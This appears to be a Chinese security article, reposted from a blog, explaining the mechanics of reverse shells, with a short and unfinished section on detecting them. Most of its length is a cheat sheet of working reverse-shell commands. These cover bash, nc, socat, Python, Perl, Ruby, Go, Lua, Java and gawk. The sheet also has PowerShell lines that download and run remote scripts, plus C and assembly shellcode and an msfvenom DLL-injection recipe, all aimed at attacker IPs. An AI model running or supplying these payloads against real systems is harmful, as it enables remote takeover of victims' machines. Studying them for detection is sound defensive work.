#                     入侵检测——反弹Shell原理以及常见检测技术

> 主要内容转载自  [郑瀚Andrew](https://home.cnblogs.com/u/LittleHann/)的 [反弹Shell原理及检测技术研究](https://www.cnblogs.com/LittleHann/p/12038070.html)

**目录(Content)**

- [1. 反弹Shell的概念本质](https://www.cnblogs.com/LittleHann/p/12038070.html#_label0)

- [2. 网络通信（network api）方式讨论](https://www.cnblogs.com/LittleHann/p/12038070.html#_label1)

- - [0x1：/dev/[tcp|udp\]【4层协议】](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_0)

  - - [1. 从文件描述（file descriptor）符说起](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_1_0_0)
    - [2. 重定向](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_1_0_1)

  - [0x2：通过建立socket tcp连接实现网络通信【4层协议】 ](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1)

  - [0x3：使用ICMP实现网络通信【4层协议】](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_2)

  - [0x4：使用DNS实现网络通信【7层协议】](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_3)

- [3. 命令执行（system executor）方式讨论](https://www.cnblogs.com/LittleHann/p/12038070.html#_label2)

- - [0x1：通过管道符传递指令](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_0)
  - [0x2：通过调用glibc api执行系统指令](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_1)
  - [0x3：通过直接调用系统调用执行指令](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_2)

- [4. 反弹Shell攻击组合方式讨论](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3)

- - [0x1：“重定向符”+"/dev/tcp网络通信"Bash反弹Shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_0)

  - [0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_1)

  - - [1. nc](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_0)
    - [2. telnet反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_1)
    - [3. socat反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_2)
    - [4. Xterm ](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_3)

  - [0x3：“管道符”+ “socket网络通信”实现bash反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_2)

  - - [1. 基于匿名管道（pipe）传递指令流](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_2_0)
    - [2. 基于命名管道（fifo）](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_2_1)

  - [0x4：git解释性脚本语言反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_3)

  - - [1. python反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_0)
    - [2. perl反弹shell ](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_1)
    - [3. ruby反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_2)
    - [4. go反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_3)
    - [6. lua反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_4)
    - [7. java](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_5)
    - [8. gawk](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_6)
    - [9. powershell反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_7)
    - [10. regsvr32反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_8)

  - [0x5：msf生成payload反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_4)

  - - [1. 生成脚本解释型代码并执行](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_0)
    - [2. 生成编译型二进制文件并执行](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_1)
    - [3. 内存shellcode执行](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_2)
    - [4. 通过dll进程注入执行反弹shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_3)

  - [0x6：dns_shell & icmp_shell](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_5)

- [5. 反弹Shell检测思路](https://www.cnblogs.com/LittleHann/p/12038070.html#_label4)

- - [0x1：进程 file descriptor 异常检测](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_0)

  - - [1. 检测 file descriptor 是否指向一个socket](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_4_0_0)
    - [1. 检测 file descriptor 是否指向一个管道符（pipe）](https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_4_0_1)

  - [0x3：netlink监控+fd异常检测](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_1)

  - [0x4：脚本文件 && 应用程序 && 无文件（fileless）反弹shell检测](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_2)

  - [0x5：网络层反弹shell通信特征检测](https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_3)

[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)

# 1. 反弹Shell的概念本质

所谓的反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。 

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png)

本文会先分别讨论：

- 命令执行（system executor）
- 网络通信（network api）

这两个基础原子概念，然后在之后的章节中用组合的方式来呈现现在主流的反弹shell技术方式及其原理，用这种横向和纵向拆分的方式来帮助读者朋友更好地理解反弹shell。

 

[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)

# 2. 网络通信（network api）方式讨论

## 0x1：/dev/[tcp|udp]【4层协议】

### 1. 从文件描述（file descriptor）符说起

linux文件描述符可以理解为**linux跟踪打开文件而分配的一个数字句柄**，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。

当Linux启动的时候会默认打开三个文件描述符，分别是：

- 标准输入：standard input 0 （默认设备键盘）
- 标准输出：standard output 1（默认设备显示器）
- 错误输出：error output 2（默认设备显示器）

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214103946845-1739367665.png)

进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符。

**Linux一切皆文件**，键盘、显示器设备也是文件，因此他们的输入输出也是由文件描述符控制。如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。

### 2. 重定向

重定向主要分为两种

- 输入重定向
  - “<”
  - “<<”
- 输出重定向
  - “>”
  - “>>”

bash在执行一条指令的时候，首先会检查命令中是否存在文件描述符重定向的符号，如果存在那么**首先将文件描述符重定向（预处理）**，然后在把重定向去掉，继续执行指令。如果指令中存在多个重定向，重定向**从左向右解析**。

#### 1）输入重定向

```
[n]< word 
（注意[n]与<之间没有空格）
```

说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110352181-1114204290.png)

解析器解析到 "<" 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110751434-1161244658.png)

#### 2）输出重定向

```
[n]> word
```

说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214110913956-79867805.png) 

上述指令将文件描述符1（标准输出）重定向到了指定文件。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111019277-654958095.png)

#### 3）标准输出与标准错误输出重定向

下面3种形式完全等价，

```
&> word 
>& word
> word 2>&1：将标准错误输出复制到标准输出
```

说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开）。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111747902-1023189028.png) 

解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214111821295-137624665.png)

#### 4）文件描述符的复制

```
[n]<&[m] 
n]>&[m] 
注意：这里所有字符之间不要有空格
```

- 这两个指令都是将文件描述符 n 复制到 m ，两者的区别是
  - [n]<&[m] ：以只读的形式打开
  - n]>&[m] ：以写的形式打开
- 这里的 & 目的是为了区分数字名字的文件和文件描述符，如果没有 & 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113225130-460473756.png)

注意，重定向符号的顺序不能随便换，因为系统是从左到右执行。我们来分析上面指令结果出现的原理，

**首先解析器解析到 2>&1**

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113307927-498723848.png)

**解析器再向后解析到 “>”** 

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214113402709-148725631.png)

#### 5）exec 绑定重定向

```
exec [n] <> file/[n]：以读写方式打开file指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入
exec [n] < file/[n] 
exec [n] > file/[n]
```

使用 exec 指令，可以让重定向在接下来的会话中（多条指令）持续有效。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114049434-1826483874.png)

 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191214114254852-1959897938.png)

## 0x2：通过建立socket tcp连接实现网络通信【4层协议】 

## 0x3：使用ICMP实现网络通信【4层协议】

## 0x4：使用DNS实现网络通信【7层协议】

**Relevant Link:** 

```
https://xz.aliyun.com/t/2548 
```

 

[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)

# 3. 命令执行（system executor）方式讨论

## 0x1：通过管道符传递指令

```
echo "hello" | cat
```

## 0x2：通过调用glibc api执行系统指令

本质上来说，Linux系统中的ring3应用程序启动时都会加载glibc.so库，glibc库中对Linux系统调用实现了封装。应用程序可以像使用C库那样，安全地使用系统调用。

## 0x3：通过直接调用系统调用执行指令

一般来说，应用程序可以通过glibc封装出的接口来使用系统调用，这样避免一些锁、传参检查等问题。但是技术上，应用程序完全也可以绕过glibc，直接发起syscall系统调用。

 

[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)

# 4. 反弹Shell攻击组合方式讨论

有了之前对命令执行和网络通信方式底层原理的讨论之后，这一章开始，我们将其进行横向和纵向的组合，讨论具体的反弹Shell姿势，并对每种姿势的底层原理进行分析。

## 0x1：“重定向符”+"/dev/tcp网络通信"Bash反弹Shell

这一类反弹shell的本质是把bash/zsh等进程的 0 1 2 输入输出重定向到远程socket，由socket中获取输入，重定向 标准输出（1）和错误输出（2）到socket。

```
attacker机器上执行：
nc -lvp 2333

victim 机器上执行：
bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
```

- “bash -i”：bash 是linux的一个比较常见的shell，除此之外还有 sh、zsh、等，他们之间有着细小差别
- “-i”：这个参数表示的是产生交互式的shell
- “/dev/tcp/ip/port”：/dev/tcp|udp/ip/port 这个文件可以将其看成一个设备（Linux下一切皆文件），对这个文件进行读写，就能实现与监听端口的服务器的socket通信
- ”>&“：混合输出（错误、正确输出都输出到一个地方），避免受害者机器上依然能看到我们在攻击者机器中执行的指令
- 0>&1：输入0是由 /dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到 /dev/tcp/192.168.146.129/2333 上，这就形成了一个回路，实现了我们远程交互式shell 的功能
  - ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215091731268-1852930532.png) 

常见的变种命令行如下：

- 方式一：显式用“2>&1”来对错误输出进行重定向 
  - bash -i > /dev/tcp/192.168.146.129/2333 0>&1 2>&1
- 方式二：唯一区别就是 0>&1 和 0<&1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别
  - bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
  - bash -i >& /dev/tcp/192.168.146.129/2333 0<&1
- 方式三：
  - bash -i >& /dev/tcp/192.168.146.129/2333 <&2
  - bash -i >& /dev/tcp/192.168.146.129/2333 0<&2
  - ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215093600154-402836042.png)

- 方式四：
  - exec 5<>/dev/tcp/192.168.146.129/2333;cat <&5|while read line;do $line >&5 2>&1;done
    - “exec 5<>/dev/tcp/192.168.146.129/2333”：这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是读写方式，于是我们就能通过文件描述符对这个socket连接进行操作了
    - “command|while read line do .....done”：从文件中依次读取每一行，将其赋值给 line 变量（这里变量可以很多，以空格分隔），之后再在循环中对line进行操作。
    - ”>&5 2>&1“：使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能
  - 0<&196;exec 196<>/dev/tcp/192.168.146.129/4444; sh <&196 >&196 2>&196
- 方式五：
  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.129 2333 >/tmp/f
    - “mkfifo”：首先创建了一个管道
    - “cat”：将管道里面的内容输出传递给/bin/sh
    - “/bin/sh -i 2>&1|nc .... > /tmp/f”：sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路
  - mknod backpipe p; nc 192.168.146.129 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe

## 0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能

第三方软件可以通过编译性或者解释性语言，在内部实现系统命中的调用执行以及网络双向通信的功能。理论上说，这类方式的变化是无限的。

### 1. nc

nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）

```
nc -e /bin/sh 192.168.146.129 2333
```

### 2. telnet反弹shell

```
mknod a p; telnet 10.211.55.2 7777 0<a | /bin/bash 1>a
telnet x.x.x.x 6666 | /bin/bash | telnet x.x.x.x 5555
```

### 3. socat反弹shell

```
# 监听命令
socat file:`tty`,raw,echo=0 tcp-listen:9999

# 反弹命令
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999
```

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215201848293-652984613.png) 

### 4. Xterm 

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
# 在主控端配置
# 开启Xserver：　　# TCP 6001
Xnest :1                

# 授予目标机连回来的权限：
xterm -display 127.0.0.1:1          # Run this OUTSIDE the Xnest, another tab
xhost +targetip                         # Run this INSIDE the spawned xterm on the open X Server
# 如果想让任何人都连上：
xhost +                      

# 在受控端执行
# 假设xterm已安装，连回你的Xserver：
xterm -display attackerip:1
或者：
$ DISPLAY=attackerip:0 xterm
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

## 0x3：“管道符”+ “socket网络通信”实现bash反弹shell

### 1. 基于匿名管道（pipe）传递指令流

匿名管道（pipe）是内核中的一个单向数据通道，管道有一个读端和一个写端。一般用于父子进程之间的通信。

```
# client
nc 192.168.43.146 7777 | /bin/bash | nc 192.168.43.146 8888
# server
ncat -lvvp 7777
# server 
ncat -lvvp 8888
```

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104646111-1137243959.png)

bash进程的输入输出都来自其他进程的pipe。

### 2. 基于命名管道（fifo）

fifo是命名管道也被称为FIFO文件，它是一种特殊类型的文件，它在文件系统中以文件名的形式存在（因为多个进程要识别），它的行为和匿名管道类似（一端读一端写），但是FIFO文件也不在磁盘进行存储。一般用于进程间的通信。

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 110.211.55.2 7777 >/tmp/f
```

- mkfifo 命令首先创建了一个管道
- cat 将管道里面的内容输出传递给/bin/sh
- sh会执行管道里的命令并将标准输出和标准错误输出结果通过 nc 传到该管道，由此形成了一个回路

## 0x4：git解释性脚本语言反弹shell

### 1. python反弹shell

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

# 拆成多行方便阅读
import os,socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('ip',port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

- 使用duo2方法将第二个形参（文件描述符）指向第一个形参（socket链接）
  - os.dup2(s.fileno(),0)
  - os.dup2(s.fileno(),1)
  - os.dup2(s.fileno(),2)
- 使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程

### 2. perl反弹shell 

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
perl -e 'use Socket;$i=”10.211.55.2";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# 拆成多行方便阅读
use Socket
$i=”10.211.55.2"
$p=7777
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S")
    open(STDOUT,">&S")
    open(STDERR,">&S")
    exec("/bin/sh -i")
}
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

### 3. ruby反弹shell

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)’
```

### 4. go反弹shell

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

#### 5. php反弹shell

```
php –r  'exec("/bin/bash -i >& /dev/tcp/127.0.0.1/7777")’
```

### 6. lua反弹shell

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 7. java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### 8. gawk

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

### 9. powershell反弹shell

powershell反弹shell本质上是一些多功能代码集合，通过调用windows提供的api接口实现网络通信和指令解析执行的功能。

#### 1）powercat反弹shell

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
# 攻击者(192.168.159.134)开启监听：
nc -lvp 6666
# 或者使用powercat监听
powercat -l -p 6666

# 目标机反弹cmd shell：
powershell IEX (New-Object System.Net.Webclient).DownloadString
('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
powercat -c 192.168.159.134 -p 6666 -e cmd
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

#### 2）nishang反弹shell

Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。

**## Reverse TCP shell**

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
# 攻击者(192.168.159.134)开启监听：
nc -lvp 6666

# 目标机执行：
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666

# 或者将nishang下载到攻击者本地：
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

**## Reverse UDP shell**

```
# 攻击者(192.168.159.134)开启监听：
nc -lvup 53

# 目标机执行：
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1');
Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53
```

**## Reverse ICMP shell**

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
# 首先攻击端下载icmpsh_m.py文件
https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1

# 攻击者(192.168.159.134)执行
sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听

# 目标机(192.168.159.138)执行
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

#### 3）自定义powershell函数反弹shell

利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
# 攻击者(192.168.159.134) 开启监听 
nc -lvp 6666

# 目标机执行 
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.159.134',6666);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

#### 4）Empire 结合office反弹shell

Empire(https://github.com/EmpireProject/Empire)基于powershell的后渗透攻击框架，可利用office宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell。

- 利用office宏反弹shell 
- 利用office OLE对象插入bat文件反弹shell

**Relevant Link:** 

```
https://www.anquanke.com/post/id/99793
```

### 10. regsvr32反弹shell

## 0x5：msf生成payload反弹shell

### 1. 生成脚本解释型代码并执行

本质上就是在目标机器执行了一段Python代码，和上一章节的python反弹shell没有本质区别。

### 2. 生成编译型二进制文件并执行

本质上就是在目标机器执行了一个二进制程序。

### 3. 内存shellcode执行

通过shellcode直接调用glibc或者syscall完成反弹shell。 

#### 1）C代码

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
#include<sys/socket.h>   //构造socket所需的库
#include<netinet/in.h>  //定义sockaddr结构
int main()
{
  char *shell[2];       //用于execv调用
  int soc,remote;    //文件描述符句柄
  struct sockaddr_in serv_addr; //保存IP/端口值的结构
 
  serv_addr.sin_addr.s_addr=0x6400A8C0;  //将socket的地址设置为所有本地地址
  serv_addr.sin_port=0xBBBB;  //设置socket的端口48059
  serv_addr.sin_family=2;   //设置协议族：IP
  soc=socket(2,1,0);
  remote=connect(soc,(struct sockaddr *)&serv_addr,0x10);
 
  dup2(soc,0);   //将stdin连接client
  dup2(soc,1);   //将stdout连接client
  dup2(soc,2);   //将strderr连接到client
  shell[0]="/bin/sh";   //execve的第一个参数
  shell[1]=0;           //数组的第二个元素为NULL,表示数组结束
  execv(shell[0],shell,NULL);   //建立一个shell
}
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

#### 2）汇编语言代码

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
section .text
global _start
_start:
xor eax,eax ;清空eax
xor ebx,ebx ;清空ebx
xor edx,edx  ;清空edx
 
;soc=socket(2,1,0)
push eax  ;socket的第三个参数：0
push byte 0x1 ;socket的第二个参数：1
push byte 0x2 ;socket的第一个参数：2
mov ecx,esp ;将数组的地址设置为socketcall的第二个参数
inc bl  ;将socketcall的第一个参数设置为1
mov al,102  ;调用socketcall,分支调用号为1：SYS_SOCKET
int 0x80  ;进入核心态，执行系统调用
mov esi,eax ;将返回值(eax)存储到esi中（即soc句柄）
 
;remote=connect(soc,(struct sockaddr *)&serv_addr,0x10)
push edx; ;仍然为0，用来作为接下来压栈的数据的结束符
push long 0x6400A8C0  ;本节代码中新增，将地址反序得到的十六进制压栈
push word 0xBBBB  ;将端口压栈，十进制为48059
xor ecx,ecx ;清空ecx，以便保存结构的sa_family字段
mov cl,2  ;将ecx的地位字节，设置为2
push word cx  ;建立结构，包括端口和sin.family,共四个字节
mov ecx,esp ;将结构的地址（在栈上）复制到ecx
push byte 0x10  ;connect参数的开始，将16压栈
push ecx  ;在栈上保存结构的地址
push esi  ;将服务器文件描述符esi保存到栈
mov ecx,esp ;将参数数组的地址保存到ecx（socketcall的第二个参数）
mov bl,3  ;将bl设置为3，socketcall的第一个参数
mov al,102  ;调用socketcall，分支调用号为3：SYS_CONNECT
int 0x80  ;进入核心态，执行系统调用
 
mov ebx,esi ;将客户端的soc文件描述符复制到ebx
;dup2(soc,0)
xor ecx,ecx ;清空ecx
mov al,63 ;将系统调用的第一个参数设置为63：dup
int 0x80  ;进行系统调用
 
;dup2(client,1)
inc ecx ;ecx设置为1
mov al,63 ;准备进行系统调用:dup2:63
int 0x80  ;进行系统调用
 
;dup2(client,2)
inc ecx ;ecx设置为2
mov al,63 ;准备进行系统调用:dup2:63
int 0x80 ;进行系统调用
 
;标准的execv("/bin/sh"...
push edx
push long 0x68732f2f
push long 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0x0b
int 0x80
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

注意，push long 0x6400A8C0 这里就是IP地址，出现了00，在网络传输中会被截断。

```
nasm -f elf reverse_port_asm.asm
ld -o reverse_port_asm reverse_port_asm.o
# 然后抽取十六进制代码
objdump -d ./reverse_port_asm
# 得到shellcode 
```

### 4. 通过dll进程注入执行反弹shell

PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。
利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell、

- msfvenom生成dll后门：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.134 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll
- metasploit设置payload开启监听
- powershell下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门：IEX (New-Object Net.WebClient).DownloadString("http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll

本质上，dll进程注入和上一节介绍的shellcode执行的原理的是一样的。

## 0x6：dns_shell & icmp_shell

本质上说，dns和icmp是一种网络通信方式，使用任何语言都可以借助这两种网络通信方式进行反弹shell交互。

但是我们知道，dns和icmp和tcp/udp不一样，它们都不是直连的网络信道，而是需要通过一个第三方进行消息中转。

- dns（udp直连模式）
  - control server将指令封装成dns包格式，通过udp53直接发送给client
  - victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server
- dns（authoritative DNS server转发模式）
  - victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上
  - control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。 

**Relevant Link:** 

```
https://xz.aliyun.com/t/2549
https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html
https://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html
https://xz.aliyun.com/t/6727
```

 

[回到顶部(go to top)](https://www.cnblogs.com/LittleHann/p/12038070.html#_labelTop)

# 5. 反弹Shell检测思路

## 1.进程 file descriptor 异常检测

### 1.1 检测 file descriptor 是否指向一个socket

以“重定向符”+"/dev/tcp网络通信"Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为**file descriptor的重定向到一个socket句柄**。

![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104034125-1531808234.png)

 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png) 

